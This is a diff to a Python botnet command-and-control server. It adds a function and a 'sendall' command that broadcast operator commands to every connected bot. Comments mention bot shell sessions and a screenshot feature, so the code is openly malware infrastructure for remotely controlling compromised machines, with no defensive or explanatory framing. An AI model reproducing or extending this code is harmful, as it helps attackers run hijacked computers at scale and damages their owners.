@@ -8,6 +8,14 @@ import base64
 
 
 
+# For screenshot function
+count = 0
+
+# Sending command to all bots
+def send2all(target, data):
+    json_data = json.dumps(data)
+    target.send(json_data.encode('utf-8'))
+
 # Interacting with the session bots
 def shell(target, ip):
 
@@ -165,10 +173,23 @@ while True:
     elif command == "exit":
         for target in targets:
             target.close()
-
         s.close()
-
         stop_threads = True
-
         t.join()
         break
+
+    # Send to all bots
+    elif command[:7] == "sendall":
+        len_of_targets = len(targets)
+        i = 0
+        try:
+            while i < len_of_targets:
+                target_index = targets[i]
+                print(target_index)
+                send2all(target_index, command)
+                i += 1
+        except:
+            print("[-] Failed commanding all bots!")
+
+    else:
+        print("[-] Command Doesn't Exist!")
